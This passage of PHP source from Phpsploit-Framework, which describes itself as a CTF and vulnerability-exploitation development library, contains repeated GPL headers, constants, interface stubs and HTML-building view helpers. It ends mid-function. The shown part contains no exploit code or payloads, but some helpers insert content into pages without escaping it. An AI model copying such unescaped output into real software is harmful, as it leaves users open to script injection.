    const INTEGER_MIN_LENGTH         = 1;
    const INTEGER_MAX_LENGTH         = 18;
    const OCT_MAX_VALUE              = 067405553164730777777;
    const OCT_MIN_LENGTH             = 1;
    const OCT_MAX_LENGTH             = 20;
    const HEX_MIN_LENGTH             = 1;
    const HEX_MAX_LENGTH             = 16;
    const PORT_MIN_VALUE             = 0;
    const PORT_MAX_VALUE             = 65535;
    const SIZE_INTEGER_SPACE         = 16;
    const CHAR_ZERO                  = '0';
    const ASCII_CODE_ZERO            = "\0";
    const INTEGER_BOOLEAN_TRUE       = 1;
    const INTEGER_BOOLEAN_FALSE      = 0;
    const OFFSET_BLOCK_MIN           = 0;
    const OFFSET_BLOCK_MAX           = 1048448;
    const OFFSET_BLOCK_AUTOINCREMENT = 128;
    const OFFSET_BLOCK_COUNT         = 8192;

    const DATA_FORMAT_STRING_NULL_FILL_PACK      = "a*";
    const DATA_FORMAT_64_INTEGER_PACK            = "a*";
    const DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK = 1001;
    const DATA_FORMAT_TYPE_64_INTEGER_PACK       = 2001;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Document extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Socket extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:26
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_RawSocket extends Interface_Base
{
    const TYPE_RESOURCE_SOCKET               = "RawSocket";
    const HOST_IVP4                          = "172.17.0.1";
    const HOST_IPV6                          = "2001:db8:1::242:ac11:1";
    const DOCKER_IPV4_172_17_0_2             = "172.17.0.2";
    const DOCKER_IPV4_172_17_0_3             = "172.17.0.3";
    const DOCKER_IPV4_172_17_0_4             = "172.17.0.4";
    const DOCKER_IPV6_2001_DB8_1__242_AC11_2 = "2001:db8:1::242:ac11:2";
    const DOCKER_IPV6_2001_DB8_1__242_AC11_3 = "2001:db8:1::242:ac11:3";
    const DOCKER_IPV6_2001_DB8_1__242_AC11_4 = "2001:db8:1::242:ac11:4";
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Security extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Operate_User extends Interface_Operate
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Lock extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_File extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:18
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Root extends \stdClass implements Interface_Root
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:36
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base extends Class_Root implements Interface_Base
{
    public static function class_exists ( $class_name )
    {
        if ( is_string ( $class_name ) && ( strlen ( $class_name ) > 0 ) ) {
            try {
                return class_exists ( $class_name );
            } catch ( \Exception $e ) {
                return false;
            }
        }
        return false;
    }

    public static function interface_exists ( $interface_name )
    {
        if ( is_string ( $interface_name ) && ( strlen ( $interface_name ) > 0 ) ) {
            try {
                return interface_exists ( $interface_name );
            } catch ( \Exception $e ) {
                return false;
            }
        }
        return false;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:34
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate extends Class_Root implements Interface_Operate
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:16
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller extends Class_Root implements Interface_Controller
{
    protected static function before_hook ( $params = array () )
    {
        return null;
    }

    protected static function after_hook ( $params = array () )
    {
        return null;
    }

    public static function index ( $params = array () )
    {
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:31
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View extends Class_Root implements Interface_View
{
    private static $_menu = array (
        'home' => '/' ,
    );

    public static function test ()
    {
        return debug_backtrace ( true );
    }

    public static function index ( $top = array ( "menu" => null , "content" => null ) , $body = array ( "menu" => null , "content" => null ) , $bottom = array ( "menu" => null , "content" => null ) )
    {
        return self ::index_page ( $top , $body , $bottom );
    }

    public static function top ( $top )
    {
        if ( ! is_array ( $top ) ) {
            $top = array ();
        }
        if ( ( ! isset( $top[ "lang" ] ) ) || ( ! is_string ( $top[ "lang" ] ) ) ) {
            $top[ "lang" ] = "en";
        }
        if ( ( ! isset( $top[ "charset" ] ) ) || ( ! is_string ( $top[ "charset" ] ) ) ) {
            $top[ "charset" ] = "utf-8";
        }
        if ( ( ! isset( $top[ "title" ] ) ) || ( ! is_string ( $top[ "title" ] ) ) ) {
            $top[ "title" ] = "";
        }
        if ( ( ! isset( $top[ "javascript" ] ) ) || ( ! is_string ( $top[ "javascript" ] ) ) ) {
            $top[ "javascript" ] = '<script type="text/javascript"></script>';
        }
        if ( ( ! array_key_exists ( "menu" , $top ) ) || ( ! is_array ( $top ) ) ) {
            $top[ "menu" ] = array ();
        }
        if ( ( ! isset( $top[ "content" ] ) ) || ( ! is_string ( $top[ "content" ] ) ) ) {
            $top[ "content" ] = "";
        }
        $_charset    = $top[ "charset" ];
        $_title      = $top[ "title" ];
        $_javascript = $top[ "javascript" ];
        $_menu       = '<table style="width:100%;height:100%;"><tr>';
        foreach ( $top[ "menu" ] as $key => $item ) {
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ! is_string ( $item[ "describe" ] ) ) ) {
                $item[ "describe" ] = "";
            }
            if ( ( ! isset( $item[ "href" ] ) ) || ( ! is_string ( $item[ "href" ] ) ) ) {
                $item[ "href" ] = "#";
            }
            if ( ! isset( $item[ "title" ] ) || ( ! is_string ( $item[ "title" ] ) ) ) {
                $item[ "title" ] = "";
            }
            $_menu .= '<td style="text-align: center;"><a href="' . Class_Base_Format ::htmlentities ( $item[ "href" ] ) . '">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</a></td>';
        }
        $_menu    .= '</tr></table>';
        $_content = $top[ "content" ];
        $_html    = '<!DOCTYPE html><html lang="' . $top[ "lang" ] . '"><head><meta charset="' . Class_Base_Format ::htmlentities ( $_charset ) . '"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" /><meta http-equiv="Pragma" content="no-cache" /><meta http-equiv="Expires" content="0" /><title>' . Class_Base_Format ::htmlentities ( $_title ) . '</title>' . $_javascript . '</head><body onload="init();"><div style="padding-top:3%;">' . $_content . '</div><div>' . $_menu . '</div>';
        return $_html;
    }

    public static function bottom ( $bottom )
    {
        if ( ! is_array ( $bottom ) ) {
            $bottom = array ();
        }
        if ( ( ! array_key_exists ( "menu" , $bottom ) ) || ( ! is_array ( $bottom ) ) ) {
            $bottom[ "menu" ] = array ();
        }
        if ( ( ! isset( $bottom[ "content" ] ) ) || ( ! is_string ( $bottom[ "content" ] ) ) ) {
            $bottom[ "content" ] = "";
        }
        if ( ( ! isset( $bottom[ "javascript" ] ) ) || ( ! is_string ( $bottom[ "javascript" ] ) ) ) {
            $bottom[ "javascript" ] = '<script type="text/javascript">function init(){ console.log("Page loading completed ! "); }function submit(form_object){ return true;}</script>';
        }
        $_menu = '<table style="width:100%;height:100%;font-size: 18px;"><tr>';
        foreach ( $bottom[ "menu" ] as $key => $item ) {
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ! is_string ( $item[ "describe" ] ) ) ) {
                $item[ "describe" ] = "";
            }
            if ( ( ! isset( $item[ "href" ] ) ) || ( ! is_string ( $item[ "href" ] ) ) ) {
                $item[ "href" ] = "#";
            }
            if ( ! isset( $item[ "title" ] ) || ( ! is_string ( $item[ "title" ] ) ) ) {
                $item[ "title" ] = "";
            }
            $_menu .= '<td style="text-align: center;"><a title="' . Class_Base_Format ::htmlentities ( $item[ "describe" ] ) . '" href="' . Class_Base_Format ::htmlentities ( $item[ "href" ] ) . '">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</a></td>';
        }
        $_menu       .= '</tr></table>';
        $_content    = $bottom[ "content" ];
        $_javascript = $bottom[ "javascript" ];
        $_html       = '<div style="height:32px;"></div><div>' . $_menu . '</div><div>' . $_content . '</div></body>' . $_javascript . '</html>';
        return $_html;
    }

    public static function menu ( $menu )
    {
        if ( ! is_array ( $menu ) ) {
            $menu = array ();
        }
        $_html = '<div>';
        foreach ( $menu as $key => $item ) {
            if ( ! is_array ( $item ) ) {
                $item = array ();
            }
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ! is_string ( $item[ "describe" ] ) ) ) {
                $item[ "describe" ] = "";
            }
            if ( ( ! isset( $item[ "href" ] ) ) || ( ! is_string ( $item[ "href" ] ) ) ) {
                $item[ "href" ] = "";
            }
            if ( ( ! isset( $item[ "title" ] ) ) || ( ! is_string ( $item[ "title" ] ) ) ) {
                $item[ "title" ] = "";
            }
            $_html .= '<div style="text-align: center;" title="' . Class_Base_Format ::htmlentities ( $item[ "describe" ] ) . '"><a href="' . Class_Base_Format ::htmlentities ( $item[ "href" ] ) . '">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</a></div>';
        }
        $_html .= '</div>';
        return $_html;
    }

    public static function content ( $content = "" )
    {
        $html = '<div>' . $content . '</div>';
        return $html;
    }

    public static function body ( $body )
    {
        if ( ! is_array ( $body ) ) {
            $body = array ();
        }
        if ( ! is_array ( $body[ "menu" ] ) ) {
            $body[ "menu" ] = array ();
        }
        if ( ( ! isset( $body[ "content" ] ) ) || ( ! is_string ( $body[ "content" ] ) ) ) {
            $body[ "content" ] = "";
        }
        $_menu = '<table style="width:100%;height:100%;">';
        foreach ( $body[ "menu" ] as $key => $item ) {
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ! is_string ( $item[ "describe" ] ) ) ) {
                $item[ "describe" ] = "";
            }
            if ( ( ! isset( $item[ "href" ] ) ) || ( ! is_string ( $item[ "href" ] ) ) ) {
                $item[ "href" ] = "#";
            }
            if ( ! isset( $item[ "title" ] ) || ( ! is_string ( $item[ "title" ] ) ) ) {
                $item[ "title" ] = "";
            }
            $_menu .= '<tr style="height:64px;line-height: 64px;"><td style="text-align: left;"><a title="' . Class_Base_Format ::htmlentities ( $item[ "describe" ] ) . '" href="' . Class_Base_Format ::htmlentities ( $item[ "href" ] ) . '" target="' . ( empty( $item[ "window" ] ) ? "_self" : "_blank" ) . '" >' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</a></td></tr>';
        }
        $_menu    .= '</table>';
        $_content = $body[ "content" ];
        $_html    = '<div style="width:100%;"><table style="width:100%;"><tr><td style="width:20%;padding-left:2%;padding-right:5%;padding-top:64px;font-size:16px;text-align: center;">' . $_menu . '</td><td style="width:80%;padding-top:0;text-align: center;"><div style="">' . $_content . '</div></td></tr></table></div>';
        return $_html;
    }

    public static function index_page ( $top = array ( "menu" => null , "content" => null , "javascript" => null ) , $body = array ( "menu" => null , "content" => null ) , $bottom = array ( "menu" => null , "content" => null , "javascript" => null ) )
    {
        $_html = self ::top ( $top ) . self ::body ( $body ) . self ::bottom ( $bottom );
        return $_html;
    }

    public static function list_page ( $top = array ( "menu" => null , "content" => null ) , $list = array ( "page" => 1 , "pagesize" => 20 , "total" => 0 , "list" => array () , "search" => "" ) , $bottom = array ( "menu" => null , "content" => null ) )
    {
        if ( ! is_array ( $list ) ) {
            $list = array ();
        }
        if ( ( ! isset( $list[ "page" ] ) ) || ( ! is_integer ( $list[ "page" ] ) ) ) {
            $list[ "page" ] = 1;
        }
        if ( ( ! isset( $list[ "pagesize" ] ) ) || ( ! is_integer ( $list[ "pagesize" ] ) ) ) {
            $list[ "pagesize" ] = 20;
        }
        if ( ( ! isset( $list[ "total" ] ) ) || ( ! is_integer ( $list[ "total" ] ) ) ) {
            $list[ "total" ] = 0;
        }
        if ( ( ! isset( $list[ "list" ] ) ) || ( ! is_array ( $list[ "list" ] ) ) ) {
            $list[ "list" ] = array ();
        }
        if ( ( ! isset( $list[ "search" ] ) ) || ( ! is_string ( $list[ "search" ] ) ) ) {
            $list[ "search" ] = "";
        }
        $_html = self ::top ( $top ) . self ::list_table ( $list[ "page" ] , $list[ "pagesize" ] , $list[ "total" ] , $list[ "list" ] , $list[ "search" ] ) . self ::bottom ( $bottom );
        return $_html;
    }

    public static function list_table ( $page , $page_size , $max_page , $row_total , $list = array () , $search = array ( "action" => null , "name" => null , "value" => null ) )
    {
        $page      = intval ( $page );
        $page_size = intval ( $page_size );
        $row_total = intval ( $row_total );
        if ( ! is_array ( $list ) ) {
            $list = array ();
        }
        if ( ! is_array ( $search ) ) {
            $search = array ();
        }
        if ( ( ! array_key_exists ( "action" , $search ) ) || ( ! is_string ( $search[ "action" ] ) ) ) {
            $search[ "action" ] = "";
        }
        if ( ( ! array_key_exists ( "name" , $search ) ) || ( ! is_string ( $search[ "name" ] ) ) ) {
            $search[ "name" ] = "search";
        }
        if ( ( ! array_key_exists ( "value" , $search ) ) || ( ! is_string ( $search[ "value" ] ) ) ) {
            $search[ "value" ] = "";
        }

        $_list      = '';
        $_list      .= '<div>';
        $_list      .= '<div style="padding-top: 32px;font-size: 18px;"><table style="width:100%;"><tr><td width="20%">search:</td><td width="80%" style="text-align: left;"><form action="' . Class_Base_Format ::htmlentities ( Class_Base_Format ::action ( $search[ "action" ] ) ) . '" method="post"><input name="' . Class_Base_Format ::htmlentities ( $search[ "name" ] ) . '" type="text" value="' . Class_Base_Format ::htmlentities ( $search[ "value" ] ) . '" style="width:60%;line-height:24px;font-size:18px;border-width:2px;text-align:center;">&nbsp;&nbsp;<input name="submit" type="submit" value="&nbsp;submit&nbsp;" style="line-height:25px;font-size:20px;border-width:2px;"></form></td></tr></table></div>';
        $_list      .= '<div style="padding-top: 32px;"><table style="width:90%;">';
        $_item_size = 0;
        foreach ( $list as $index => $item ) {
            if ( is_array ( $item ) ) {
                $_item_index = 0;
                if ( $_item_size <= 0 ) {
                    $_item_size = count ( $item );
                }
                $_list .= '<tr>';
                foreach ( $item as $key => $value ) {
                    $_list .= '<td style="text-align: left;padding-top: 14px;padding-bottom: 14px;">' . $key . ' : </td><td style="text-align: left;padding-top: 14px;padding-bottom: 14px;padding-right: 64px;">' . $value . '</td>';
                    $_item_index ++;
                }
                while ( $_item_index < $_item_size ) {
                    $_list .= '<td style="text-align: left;padding-top: 14px;padding-bottom: 14px;">&nbsp;</td><td style="text-align: left;padding-top: 14px;padding-bottom: 14px;">&nbsp;</td>';
                    $_item_index ++;
                }
                $_list .= '</tr>';
            }
        }
        $_list .= '</table></div>';
        $_list .= '<div style="padding-top: 32px;font-size:18px;"><table style="width:100%;text-align: left;"><tr><td>page:</td><td style="text-align: left;padding-right:32px;">' . $page . '</td><td>page size:</td><td style="text-align: left;padding-right:32px;">' . $page_size . '</td><td>max page:</td><td style="text-align: left;padding-right:32px;">' . $max_page . '</td><td>row total:</td><td style="text-align: left;padding-right:32px;">' . $row_total . '</td><td>to page:</td><td>';
        $_list .= '<select name="page" size="1" style="width:100%;height:32px;line-height:24px;font-size:18px;border-width:2px;text-align:center;" onchange="document.location.href=\'' . Class_Base_Response ::get_url ( $search[ "action" ] ) . '&page=\'+this.value+\'&page_size=' . $page_size . '&key=' . Class_Base_Format ::htmlentities ( $search[ "value" ] ) . '\';">';
        for ( $index = 1 ; $index <= $max_page ; $index ++ ) {
            $_list .= '<option value="' . $index . '" ' . ( ( $page != $index ) ? "" : "selected" ) . '>' . $index . '</option>';
        }
        $_list .= "</select>";
        $_list .= '</td><td width="10%;"></td></tr></table></div>';
        $_list .= '</div>';
        return $_list;
    }

    public static function detail_page ( $top , $detail , $bottom )
    {
        $_html = self ::top ( $top ) . self ::detail ( $detail ) . self ::bottom ( $bottom );
        return $_html;
    }

    public static function detail ( $detail )
    {
        $_form = '';
        $_form .= '<div>';
        $_form .= '<table style="width:100%;">';
        foreach ( $detail as $index => $item ) {
            $_form .= '<tr><td width="20%;">' . $item[ 'title' ] . '</td><td width="20%;">' . $item[ 'content' ] . '</td></tr>';
        }
        $_form .= '</table>';
        $_form .= '</div>';
        return $_form;
    }

    public static function init_form ( $form )
    {
        if ( ! is_array ( $form ) ) {
            $form = array ();
        }
        if ( ( ! isset( $form[ "action" ] ) ) || ( ! is_string ( $form[ "action" ] ) ) ) {
            $form[ "action" ] = "";
        }
        if ( ( ! isset( $form[ "hiddens" ] ) ) || ( ! is_array ( $form[ "hiddens" ] ) ) ) {
            $form[ "hiddens" ] = array ();
        }
        if ( ( ! isset( $form[ "selects" ] ) ) || ( ! is_array ( $form[ "selects" ] ) ) ) {
            $form[ "selects" ] = array ();
        }
        if ( ( ! isset( $form[ "inputs" ] ) ) || ( ! is_array ( $form[ "inputs" ] ) ) ) {
            $form[ "inputs" ] = array ();
        }
        if ( ( ! isset( $form[ "textareas" ] ) ) || ( ! is_array ( $form[ "textareas" ] ) ) ) {
            $form[ "textareas" ] = array ();
        }
        if ( ( ! isset( $form[ "files" ] ) ) || ( ! is_array ( $form[ "files" ] ) ) ) {
            $form[ "files" ] = array ();
        }
        if ( ( ! isset( $form[ "gets" ] ) ) || ( ! is_array ( $form[ "gets" ] ) ) ) {
            $form[ "gets" ] = array ();
        }
        if ( ( ! isset( $form[ "id" ] ) ) || ( ! is_string ( $form[ "id" ] ) ) ) {
            $form[ "id" ] = "form_id_1";
        }
        if ( ( ! isset( $form[ "name" ] ) ) || ( ! is_string ( $form[ "name" ] ) ) ) {
            $form[ "name" ] = "form1";
        }
        if ( ( ! isset( $form[ "enctype" ] ) ) || ( ! is_string ( $form[ "enctype" ] ) ) ) {
            $form[ "enctype" ] = "multipart/form-data";
        }
        if ( ( ! isset( $form[ "submit" ] ) ) || ( ! is_array ( $form[ "submit" ] ) ) ) {
            $form[ "submit" ] = array ();
        }
        if ( ( ! isset( $form[ "submit" ][ "display" ] ) ) || ( ! is_bool ( $form[ "submit" ][ "display" ] ) ) ) {
            $form[ "submit" ][ "display" ] = true;
        }
        if ( ( ! isset( $form[ "submit" ][ "id" ] ) ) || ( ! is_string ( $form[ "submit" ][ "id" ] ) ) ) {
            $form[ "submit" ][ "id" ] = "";
        }
        if ( ( ! isset( $form[ "submit" ][ "name" ] ) ) || ( ! is_string ( $form[ "submit" ][ "name" ] ) ) ) {
            $form[ "submit" ][ "name" ] = "";
        }
        if ( ( ! isset( $form[ "submit" ][ "type" ] ) ) || ( ! is_string ( $form[ "submit" ][ "type" ] ) ) ) {
            $form[ "submit" ][ "type" ] = "submit";
        }
        if ( ( ! isset( $form[ "submit" ][ "value" ] ) ) || ( ! is_string ( $form[ "submit" ][ "value" ] ) ) ) {
            $form[ "submit" ][ "value" ] = " submit ";
        }
        if ( ( ! isset( $form[ "submit" ][ "title" ] ) ) || ( ! is_string ( $form[ "submit" ][ "title" ] ) ) ) {
            $form[ "submit" ][ "title" ] = "";
        }
        if ( ( ! isset( $form[ "submit" ][ "disabled" ] ) ) || ( ! is_string ( $form[ "submit" ][ "disabled" ] ) ) ) {
            $form[ "submit" ][ "disabled" ] = "";
        }
        if ( ( ! isset( $form[ "submit" ][ "events" ] ) ) || ( ! is_array ( $form[ "submit" ][ "events" ] ) ) ) {
            $form[ "submit" ][ "events" ] = array ();
        }
        $_event_processing = '';
        foreach ( $form[ "submit" ][ "events" ] as $event => $processing ) {
            if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
            }
        }
        $form[ "submit" ][ "event_processing" ] = $_event_processing;
        if ( ( ! isset( $form[ "reset" ] ) ) || ( ! is_array ( $form[ "reset" ] ) ) ) {
            $form[ "reset" ] = array ();
        }
        if ( ( ! isset( $form[ "reset" ][ "display" ] ) ) || ( ! is_bool ( $form[ "reset" ][ "display" ] ) ) ) {
            $form[ "reset" ][ "display" ] = true;
        }
        if ( ( ! isset( $form[ "reset" ][ "id" ] ) ) || ( ! is_string ( $form[ "reset" ][ "id" ] ) ) ) {
            $form[ "reset" ][ "id" ] = "";
        }
        if ( ( ! isset( $form[ "reset" ][ "name" ] ) ) || ( ! is_string ( $form[ "reset" ][ "name" ] ) ) ) {
            $form[ "reset" ][ "name" ] = "";
        }
        if ( ( ! isset( $form[ "reset" ][ "type" ] ) ) || ( ! is_string ( $form[ "reset" ][ "type" ] ) ) ) {
            $form[ "reset" ][ "type" ] = "reset";
        }
        if ( ( ! isset( $form[ "reset" ][ "value" ] ) ) || ( ! is_string ( $form[ "reset" ][ "value" ] ) ) ) {
            $form[ "reset" ][ "value" ] = " reset ";
        }
        if ( ( ! isset( $form[ "reset" ][ "title" ] ) ) || ( ! is_string ( $form[ "reset" ][ "title" ] ) ) ) {
            $form[ "reset" ][ "title" ] = "";
        }
        if ( ( ! isset( $form[ "reset" ][ "disabled" ] ) ) || ( ! is_string ( $form[ "reset" ][ "disabled" ] ) ) ) {
            $form[ "reset" ][ "disabled" ] = "";
        }
        if ( ( ! isset( $form[ "reset" ][ "events" ] ) ) || ( ! is_array ( $form[ "reset" ][ "events" ] ) ) ) {
            $form[ "reset" ][ "events" ] = array ();
        }
        $_event_processing = '';
        foreach ( $form[ "reset" ][ "events" ] as $event => $processing ) {
            if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
            }
        }
        $form[ "reset" ][ "event_processing" ] = $_event_processing;
        if ( ( ! isset( $form[ "button" ] ) ) || ( ! is_array ( $form[ "button" ] ) ) ) {
            $form[ "button" ] = array ();
        }
        if ( ( ! isset( $form[ "button" ][ "display" ] ) ) || ( ! is_bool ( $form[ "button" ][ "display" ] ) ) ) {
            $form[ "button" ][ "display" ] = false;
        }
        if ( ( ! isset( $form[ "button" ][ "id" ] ) ) || ( ! is_string ( $form[ "button" ][ "id" ] ) ) ) {
